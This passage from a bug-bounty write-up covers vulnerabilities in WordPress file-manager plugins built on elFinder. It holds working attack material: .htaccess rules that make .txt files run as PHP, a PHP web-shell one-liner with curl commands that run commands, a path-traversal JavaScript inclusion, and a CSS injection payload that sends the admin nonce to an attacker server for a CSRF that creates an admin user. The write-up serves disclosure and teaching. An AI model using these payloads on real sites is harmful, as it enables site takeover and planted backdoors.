Which **strips out character `.`, `-`, and `_`** from the beginning and the end of `$filename`. So, if the filename is `.htaccess`, the returned value will be `htaccess`:

```shell
└> php -a
[...]
php > echo trim( ".htaccess", '.-_' );
htaccess
```

Because of this, the second if statement will always be `false` when the filename is `.htaccess`, because **string `.htaccess` cannot be found in string `htaccess`**:

```php
function afmvalidName($name) {
    if([...]) {
        $name = sanitize_file_name($name);
        if(strpos($name, '.php') || strpos($name, '.ini') || strpos($name, '.htaccess') || strpos($name, '.config')) {
            return false;
        } else {
            return strpos($name, '.') !== 0;
        }
    }
}
```

Then, the else statement will **return `true`** because **our filename does NOT start with a `.` character** because of WordPress function **`sanitize_file_name`**. And remember, if the callback function return `true`, it means **the filename is valid**!

Well, you might ask: "What could go wrong when the user can upload `.htaccess` file?" Well, in Apache HTTP server, this file has a special meaning.

> `.htaccess` files (or "distributed configuration files") provide a way to make configuration changes on a per-directory basis. A file, containing one or more configuration directives, is placed in a particular document directory, and the directives apply to that directory, and all subdirectories thereof. - [https://httpd.apache.org/docs/2.4/howto/htaccess.html](https://httpd.apache.org/docs/2.4/howto/htaccess.html)

In Apache's `.htaccess` file, we can add the following rules to tell Apache to treat files with `.txt` extension as a PHP file:

```
<Files ~ ".*">
    Require all granted
    Order allow,deny
    Allow from all
</Files>

AddType application/x-httpd-php .txt
```

Inside the `Files` directive, we want every file to be publicly accessible. Then, in the [`AddType`](https://httpd.apache.org/docs/2.0/mod/mod_mime.html#addtype) directive, we set `.txt` files to have `application/x-httpd-php` MIME type, which means the file will be executed by the PHP engine.

Why Apache? In most WordPress setup, it runs a tech stack called LAMP, which stands for Linux, **Apache**, MySQL, and PHP. So, if a plugin allows users to upload `.htaccess` files, most likely that a WordPress site with this plugin installed will suffer from RCE.

Anyway, let's try to upload a `.htaccess` file! After setting up the shortcode, we can confirm that `.htaccess` file can be uploaded!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250108175459.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250108175556.png)

> Note: This plugin by default doesn't display `.htaccess` files, thus it didn't get displayed in the above image.

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250108175538.png)

Now we can upload a `.txt` file that contains a PHP code that we want to execute!

```shell
┌[siunam♥Mercury]-(~/Downloads)-[2025.01.08|17:57:39(HKT)]
└> echo -n ';;<?php system($_GET["cmd"]); ?>' > webshell.txt
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250108175834.png)

> Note: Make sure the `.txt` file is in the same directory of the `.htaccess` file.

Oh, btw I added `;;` to ensure the MIME type is `text/plain`, just in case the administrator set the allowed MIME type to `text/plain`. This can be optional. ([See `text/plain` magic number](https://github.com/waviq/PHP/blob/master/Laravel-Orang1/public/filemanager/connectors/php/plugins/rsc/share/magic.mime#L538))

Finally, we should be able to execute arbitrary PHP code!

```shell
└> curl --get http://localhost/wp-content/webshell.txt --data 'cmd=id'
;;uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Nice! Let's move on to the next common misconfiguration/mistake in elFinder.

### Writable `.htaccess` in "attributes" Option - [Advanced File Manager](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/file-manager-advanced/advanced-file-manager-5212-5213-authenticated-subscriber-arbitrary-file-upload)

In elFinder options, the "[attributes](https://github.com/Studio-42/elFinder/wiki/Connector-configuration-options-2.1#attributes)" option allows the developers to set different files and folders' permission, such as setting a file to read-only.

In class `class_fma_connector` method `fma_local_file_system`, if setting `enable_htaccess` is set to `1`, it'll set `.htaccess` file to be readable and **writable**:

```php
class class_fma_connector
{
    [...]
    public function fma_local_file_system() {
        [...]
        if(isset($settings['enable_htaccess']) && !empty($settings['enable_htaccess']) && $settings['enable_htaccess'] == '1') {
            $hide_htaccess = array(
                'pattern' => '/.htaccess/',
                'read' => true,
                'write' => true,
                'hidden' => false,
                'locked' => false
            );	
        }
        [...]
        $opts = array(
                'roots' => array(
                    // Items volume
                    array(
                        [...]
                        'attributes' => array(
                           [...]
                           $hide_htaccess
                        )
                    ),
                    [...]
                )
        );
        [...]
        // run elFinder
        $fmaconnector = new elFinderConnector(new elFinder($opts));
        $fmaconnector->run();
        die;
    }
}
```

In elFinder's "put" command, if the file is writable, the client can edit that file:

```php
abstract class elFinderVolumeDriver
{
    [...]
    public function putContents($hash, $content)
    {
        [...]
        if (!$file['write']) {
            return $this->setError(elFinder::ERROR_PERM_DENIED);
        }
        [...]
    }
}
```

So... **If `enable_htaccess` is set to `1`**, we should be able to **edit an existence `.htaccess` file**. As I mentioned previously, if we can upload/edit `.htaccess` files, we can get RCE!

Wait, `enable_htaccess`? Does this variable name means `.htaccess` is intended to be writable?? Well, no. We can see this in the "Settings" page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250108183153.png)

Huh, "**Display**"? So, this setting means `.htaccess` files **should be read-only**?? For a little bit of context here, originally `$hide_htaccess` is just an empty array, which means there's no file permission for `.htaccess` file. However, after fixing one of my findings in this plugin, version 5.2.12, changed the `$hide_htaccess` variable. You can read the diff in [here](https://plugins.trac.wordpress.org/changeset/3200092/file-manager-advanced/trunk/application/class_fma_connector.php?old=3199242&old_path=file-manager-advanced%2Ftrunk%2Fapplication%2Fclass_fma_connector.php).

With that said, we can just to edit an existence `.htaccess`! Although WordPress will [automatically generate one during the installation](https://developer.wordpress.org/advanced-administration/server/web-server/httpd/), administrators might delete it. Fortunately, the plugin already created a `.htaccess` file for us! It's in path `wp-content/plugins/file-manager-advanced/application/library/files/.htaccess`. (This file was created back in [version 5.2.5](https://plugins.trac.wordpress.org/changeset/3107587/file-manager-advanced/trunk/application/library/files/.htaccess))

So, let's allow role "Subscriber" to access the file manager, enable the "Display .htaccess?" setting, and edit that `.htaccess` file!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250108195907.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250108195957.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250108200113.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250108200207.png)

Then, upload a `.txt` file with our PHP payload:

```shell
┌[siunam♥Mercury]-(~/Downloads)-[2025.01.08|19:45:27(HKT)]
└> echo -n ';;<?php system($_GET["cmd"]); ?>' > webshell.txt
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250108200302.png)

Finally, we should be able to execute arbitrary PHP code via sending a request to path `wp-content/plugins/file-manager-advanced/application/library/files/<uploaded_filename>.txt`:

```shell
└> curl --get http://localhost/wp-content/plugins/file-manager-advanced/application/library/files/webshell.txt --data 'cmd=id'
;;uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Nice!

## No Path Validation in Loading elFinder Locale Script - [FileOrganizer: Local JavaScript File Inclusion](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/fileorganizer/fileorganizer-114-authenticated-administrator-local-javascript-file-inclusion)

Since elFinder uses jQuery for the UI, now it's a great time to review some misconfigurations/mistakes on the client-side!

During finding exact same vulnerabilities across 5 different WordPress plugins that are using elFinder library, I've been thinking this: "**Does anyone ever reported a vulnerability related to common misconfiguration/mistake in elFinder?**" I then decided to check out the most popular file manager plugin, "[File Manager](https://wordpress.org/plugins/wp-file-manager/)" (Formaly known as "WP File Manager"). One vulnerability caught my eye on the [Wordfence vulnerability database](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wp-file-manager): "[File Manager <= 7.2.4 - Cross-Site Request Forgery to Local JS File Inclusion](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wp-file-manager/file-manager-724-cross-site-request-forgery-to-local-js-file-inclusion)".

After reading the vulnerability's description and the patch, we can know that the `lang` parameter is vulnerable to **path traversal** and able to **include arbitrary JavaScript files**, thus achieving stored XSS.

[Version from 7.2.5 to 7.2.4 diff](https://plugins.trac.wordpress.org/changeset/3051451/wp-file-manager):

```diff
- 'lang' => isset($_GET['lang']) ? sanitize_text_field(htmlentities($_GET['lang'])) : (($wp_fm_lang !== false) ? $wp_fm_lang : 'en'),
+ 'lang' => isset($_GET['lang']) && in_array(sanitize_text_field(htmlentities($_GET['lang'])), $this->fm_languages()) ? sanitize_text_field(htmlentities($_GET['lang'])) : (($wp_fm_lang !== false) ? $wp_fm_lang : 'en'),
```

Hmm... Maybe I can also find the same vulnerability in other plugins. Let's take a look at plugin "[FileOrganizer](https://wordpress.org/plugins/fileorganizer/)".

After search for keywords like `lang`, we can quickly come across with this:

```php
function fileorganizer_page_handler(){
    [...]
    // Load Language dynamically
    if(!empty($fileorganizer->options['default_lang']) && $fileorganizer->options['default_lang'] != 'en') {
        wp_register_script( 'forg-lang', FILEORGANIZER_URL .'/manager/js/i18n/elfinder.'.$fileorganizer->options['default_lang'].'.js', array('jquery'), FILEORGANIZER_VERSION);
    }
    [...]
}
```

Does the above code look similar to the "File Manager"? In here, if the option `default_lang` is set to anything but not `en`, it'll register a new JavaScript with path `<FILEORGANIZER_URL>/manager/js/i18n/elfinder.<default_lang>.js`, where constant variable `FILEORGANIZER_URL` is the plugin directory's URL, like `http://localhost/wp-content/plugins/fileorganizer`. Based on [elFinder's official website](https://studio-42.github.io/elFinder/tools/langman/), this library supports i18n (internationalization and localization) translation, and all of those translations are stored in path `js/i18n/elfinder.<language_code>.js`.

As you can see, it **directly concatenates** `default_lang` to the path. Let's check whether `default_lang` is sanitized or not. 

In the settings update logic, function `fileorganizer_settings_page`, it calls function `fileorganizer_optpost`:

```php
function fileorganizer_settings_page(){
    [...]
    if(isset($_POST['save_settings'])){
        $options['default_lang'] = fileorganizer_optpost('default_lang');
        [...]
        if(update_option( 'fileorganizer_options', $options )){
            fileorganizer_notify(__('Settings saved successfully.'));
        }
        [...]
    }
}
```

Which is to get POST parameter `default_lang` and sanitize it:

```php
function fileorganizer_optpost($name, $default = ''){
    if(!empty($_POST[$name])){
        return fileorganizer_clean($_POST[$name]);
    }
    
    return $default;	
}
[...]
function fileorganizer_clean($var){
    if(is_array($var) || is_object($var)){
        $var = map_deep($var, 'wp_unslash');
        return map_deep($var, 'sanitize_text_field');
    }
    
    if(is_scalar($var)){
        $var = wp_unslash($var);
        return sanitize_text_field($var);
    }

    return '';
}
```

As you can see, the value did get sanitized, but none of those sanitizations are related to path traversal. So, in this case, **option `default_lang` is indeed vulnerable to path traversal**. In theory, we can set the `default_lang` to `/../../../../../../<our_js_filename>`, so that the path will be `<FILEORGANIZER_URL>/manager/js/i18n/elfinder./../../../../../../<our_js_filename>.js`. Unfortunately, the settings can only be changed by administrator or above privilege, because `settings.php` will only be included when the user has capability [`manage_options`](https://wordpress.org/documentation/article/roles-and-capabilities/#manage_options) or [`manage_network_options`](https://wordpress.org/documentation/article/roles-and-capabilities/#manage_network_options):

`wp-content/plugins/fileorganizer/init.php`:

```php
// This adds the left menu in WordPress Admin page
add_action('network_admin_menu', 'fileorganizer_admin_menu', 5);
add_action('admin_menu', 'fileorganizer_admin_menu', 5);
function fileorganizer_admin_menu() {
    [...]
    $manu_capability = 'manage_options';
    
    if(is_multisite()){
        $manu_capability = 'manage_network_options';
    }

    add_submenu_page( 'fileorganizer', __('Settings'), __('Settings'), $manu_capability, 'fileorganizer-settings', 'fileorganizer_settings_handler');
    [...]
}
[...]
// Include the setting handler
function fileorganizer_settings_handler(){
    include_once (FILEORGANIZER_DIR .'/main/settings.php');
    fileorganizer_settings_page();
}
```

Not only that, but function `fileorganizer_settings_page` also checks the nonce, so it's not vulnerable to CSRF:

```php
function fileorganizer_settings_page(){
    [...]
    if(isset($_POST['save_settings'])){
        // Check nonce
        check_admin_referer('fileorganizer_settings');
        [...]
    }
    [...]
}
```

Damn, so this vulnerability is administrator or above only. Well, if so, we can use the file manager to upload arbitrary JavaScript files as an administrator user (Which is an intended feature).

To exploit this local JavaScript file inclusion vulnerability, we need to first upload our own JavaScript file using the file manager:

```shell
┌[siunam♥Mercury]-(~/Downloads)-[2025.01.08|21:30:21(HKT)]
└> echo -n 'alert(document.domain)' > payload.js
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250108213128.png)

> Note: You can upload this file in anywhere inside the webroot directory, just make sure you don't traverse too far.

Then, update the language setting `default_lang` to `/../../../../../../../../payload`. We can do that by sending a POST request to `/wp-admin/admin.php?page=fileorganizer-settings`, or go to the plugin's setting page and enter the following JavaScript code in the browser console:

```javascript
document.querySelector("select[name=default_lang]").selectedOptions[0].value = "/../../../../../../../../payload";
document.querySelector("input[name=save_settings]").click();
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250108214013.png)

Finally, go to the file manager page and we should see an alert box. If not, try to hard refresh the page (Ctrl + Shift + R) to clear the cache.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250108214151.png)

Nice!

## Allowing JavaScript and/or CSS Files Upload - [Bit File Manager: Limited File Upload](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/file-manager/bit-file-manager-100-free-open-source-file-manager-and-code-editor-for-wordpress-657-authenticated-subscriber-limited-javascript-file-upload)

Ok... This one is little bit complex, feel free to take a break before continue reading!

Across those 5 plugins that are using elFinder library, I noticed that most of them don't have restriction over **CSS files** upload. In the case of Bit File Manager, administrators can set the allowed MIME types to be "text", "image", "application", and more. According to IANA (Internet Assigned Numbers Authority), the official registry of MIME media types, **[CSS files has MIME type "text"](https://www.iana.org/assignments/media-types/media-types.xhtml#text)**. So, if the administrators set the allowed MIME type to "text", the users who have access to the file manager and have file upload permission, they can upload/overwrite CSS files!

Hmm... Maybe we can perform **CSS injection by overwriting a CSS file**? Based on my CTFs experience, if we can do CSS injection, we can **exfiltrate sensitive information/CSRF token** (Or "nonce" in WordPress). Well then, what should we exfiltrate?

There are many things that we can exfiltrate and use them to gain RCE or create a "backdoor". In this example, the CSS injection payload will exfiltrate the "Add New User" nonce, and perform CSRF attack to create a new administrator user.

If we take a look at `wp-admin/user-new.php`, we need to exfiltrate nonce `_wpnonce_create-user` in order to perform CSRF attack:

```php
[...]
<?php wp_nonce_field( 'create-user', '_wpnonce_create-user' ); ?>
[...]
if ( [...] ) {
    [...]
} elseif ( isset( $_REQUEST['action'] ) && 'createuser' === $_REQUEST['action'] ) {
    check_admin_referer( 'create-user', '_wpnonce_create-user' );
    [...]
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250109134439.png)

With that in mind, we need to know overwrite which CSS file. If we hard refresh (Ctrl + Shift + R) to clear all cache, go to the browser's "Network" tab, and filter out everything except CSS files, we should be able to see which CSS files will be loaded into this page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250109134918.png)

Turns out, WordPress uses `wp-admin/load-styles.php` to load different CSS styles into the page. In the `load` GET parameter, we can set a list of seemingly CSS filenames:

```
load[chunk_0]: dashicons,admin-bar,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-pointer,widgets
load[chunk_1]: ,site-icon,l10n,buttons,wp-auth-check
```

In `wp-admin/load-styles.php`, we can see how does all the CSS files are being loaded:

```php
$load = $_GET['load'];
[...]
foreach ( $load as $handle ) {
    [...]
    $style = $wp_styles->registered[ $handle ];
    [...]
    $path = ABSPATH . $style->src;
    [...]
    $content = get_file( $path ) . "\n";
    [...]
}
```

If we set a breakpoint after the `$path` variable, we can know the path of all the loaded CSS files:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250109140102.png)

As you can see, the CSS file path is at **`wp-includes/css/dashicons.min.css`**.

> Note: I personally chose "dashicons", you can pick whatever CSS filenames in here.

Now, let's setup the environment and test the CSS injection!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250109140443.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250109140537.png)

> Note: Make sure the "Path" is within WordPress CSS directory, `wp-includes/css`.

Then, we can go to the shortcode post/page and overwrite CSS file `dashicons.min.css` at path `wp-includes/css/`:

```shell
┌[siunam♥Mercury]-(~/Downloads)-[2025.01.09|14:09:27(HKT)]
└> echo -n '// overwrite dashicons.min.css' > dashicons.min.css
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250109141028.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250109141057.png)

Finally, go to the "Add New User" page and hard refresh to clear the cache:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250109141235.png)

Nice! We can overwrite CSS file and perform CSS injection!

Now, the question is: "How can we exfiltrate the nonce using CSS styles?"

There are lots of great resources that teach CSS injection. I'd recommend you to read this series written by [Huli](https://blog.huli.tw/en/about/): [Chapter 3 - Beyond XSS: Explore the Web Front-end Security Universe](https://aszx87410.github.io/beyond-xss/en/ch3/css-injection/).

In our case, we could use the following CSS injection payload to exfiltrate nonce `_wpnonce_create-user`:

```css
form:has(input[name="_wpnonce_create-user"][value^="a"]) {
  background: url("http://localhost:8000/exfil?nonce=a");
}

form:has(input[name="_wpnonce_create-user"][value^="b"]) {
  background: url("http://localhost:8000/exfil?nonce=a");
}
[...]
form:has(input[name="_wpnonce_create-user"][value^="aa"]) {
  background: url("http://localhost:8000/exfil?nonce=aa");
}

form:has(input[name="_wpnonce_create-user"][value^="ab"]) {
  background: url("http://localhost:8000/exfil?nonce=ab");
}
[...]
```

In here, since CSS doesn't allow us to directly select hidden element, we need to use CSS selector **[`:has`](https://developer.mozilla.org/en-US/docs/Web/CSS/:has)** to select elements below that meet specific conditions. In our case, the `:has` selector is to select the `<form>` element that has `<input>` element where property `name` is `_wpnonce_create-user` and with value starting with `a`, `b`, `aa`, and so on. If the conditions are met, it'll send a GET request to our attacker website, effectively exfiltrating the nonce.

By default, WordPress nonces' length are 10, and the character set is lowercase hexadecimal. In the above approach, if we try to exfiltrate the nonce, we need to have **29,059,430,400 permutations** of CSS rules:

$$ P(n,r) = \frac{n!}{(n - r)! } $$
$$ P(n,r) = P(16,10) $$
$$ = \frac{16!}{( 16 - 10)! } $$
$$ = 29059430400 $$

Which means the CSS file size has at least 1 GB in size! There's no way that the browser can load that giant CSS file. (If you try to load a 1 GB CSS file, your browser will very likely hang and crash.)

What if we optimize the CSS selector? We could try to use `[value^=a]` (prefix), `[value$=a]` (suffix), and `[value*=a]` (contains). Since the nonce is 10 characters long, we can split it in like 4, 4, and 2 characters for prefix, suffix, and contains, which has **43680 + 43680 + 240 permutations**. Seems a lot more doable.

> Note: This is call **one-shot CSS injection**, which means the CSS injection payload is in one giant file/text. There's also another method to do the exfiltration, which uses [@import](https://developer.mozilla.org/en-US/docs/Web/CSS/@import) [at-rule](https://developer.mozilla.org/en-US/docs/Web/CSS/At-rule). However, I'm not going to do that, because I think it requires an additional domain. (Feel free to read [Huli's series](https://aszx87410.github.io/beyond-xss/en/ch3/css-injection-2/#stealing-all-characters) for more details.)

But wait, if we got 2 characters from the contains selector, how can we know the correct order of the nonce? To solve this, we can split the nonce into 4, 3, and 3 characters for prefix, suffix, and contains. Then, we can apply **[Trigram](https://en.wikipedia.org/wiki/Trigram) algorithm** to find the correct order. I also applied different techniques to make this CSS injection works, see [this 0CTF/TCTF 2023 writeup for challenge "newdiary"](https://waituck.sg/2023/12/11/0ctf-2023-newdiary-writeup.html) written by waituck for more details.

After exfiltrating the correct nonce, we can continue our CSRF attack! Here's the high-level overview of the entire exploitation steps:
- Prerequisite: Subscriber or above user access and shortcode `file-manager` must already been setup by the adminsitrator
1. Login as a subscriber or above WordPress user
2. Edit/overwrite the CSS file (such as `wp-includes/css/dashicons.min.css`) content with the one-shot CSS injection payload
3. Wait for the admin victim visit our attacker website's endpoint `/leaknonce`, which opens a new window with URL `http://<WordPress_site_domain>/wp-admin/user-new.php` to exfiltrate the nonce to our attacker web server via the CSS injection payload
4. After exfiltrating, our attacker web server uses Trigram algorithm to find the correct nonce value
5. After that our endpoint `/leaknonce` will redirect the victim to endpoint `/csrf` to perform the CSRF attack, which creates a new admin WordPress user

To automate the above steps, I have written a PoC script on my GitHub repository: [CVE-2024-8743 PoC](https://github.com/siunam321/CVE-2024-8743-PoC)

> Note: The PoC script **edits** the CSS file instead of overwrites it, so make sure you grant the "**edit**" command to the subscriber or above user.

PoC video demo:

<video src="https://github.com/user-attachments/assets/76571398-1b8c-4726-800c-9ed6c2928562" controls="controls" muted="muted" style="max-height:640px; min-height: 200px"></video>

Nice!

Now, how about without using CSS files to achieve the same goal? Well, **JavaScript files**!

Wait, can we upload/edit JavaScript if allowed MIME type is set to "text"? According to IANA, [JavaScript file's MIME type](https://www.iana.org/assignments/media-types/media-types.xhtml#text) is also "text": `text/javascript`. So, we can do that?

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250109164618.png)

Welp, nope. Can't upload, because elFinder detects JavaScript's MIME type as the old "application" type.

How about edit a JavaScript file? Let's pick a random JavaScript file that is imported in the admin page, `wp-includes/js/heartbeat.min.js`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/Pasted%20image%2020250109164959.png)

Oh! It worked!

With that said, we can also achieve the same goal by editing a JavaScript file that will be imported to a page.

Why the hell I try to overwrite a CSS file in the first place?!?!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-2/images/forehead-slap-slapping-forehead.gif)

Anyway, this is my first time applying really advance vulnerability that I've learned during CTFs into the real world. Very cool!

## Conclusion

Thank you for reading this very long writeup! I hope you learned something new! In total, I found 15+ vulnerabilities across 5 different plugins that are using the same library, elFinder. Most of their root cause is common misconfigurations/mistakes in elFinder, missing/flawed validation and sanitization.

For the bounty payout, I only got $537, $358, and $25 ($920 in total) for 3 reports. This is because **almost all of them require an administrator user to explicitly grant access to a lower-privileged user**. According to Wordfence bug bounty program's scope, this is considered as out-of scope:

> Explicitly out of scope vulnerabilities:
>   
> Vulnerabilities that can only be exploited by an administrator explicitly granting access to a lower-privileged user where the likelihood of an administrator granting access is minimal or the administrator is granting access to functionality and features that can be abused - [https://www.wordfence.com/threat-intel/bug-bounty-program/](https://www.wordfence.com/threat-intel/bug-bounty-program/)

Throughout [part 1](https://siunam321.github.io/ctf/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/) and this final part, there are some key takeaways that you can take:
1. Make sure to audit and review the plugin/theme vendor's other plugins/themes, as they might share a similar code base and pattern
2. Use debugger, such as [Xdebug](https://xdebug.org/) to find out the root cause of a vulnerability. Not only it helps you to have a better understanding in the vulnerability, but also helps you to report the vulnerability much more in depth

Lastly, I'd want to say many thanks to [Michelle](https://www.linkedin.com/in/michelleporterpdx/), [Ivan](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/ivan-kuzymchak), and other triagers for handling all of my reports! 🙏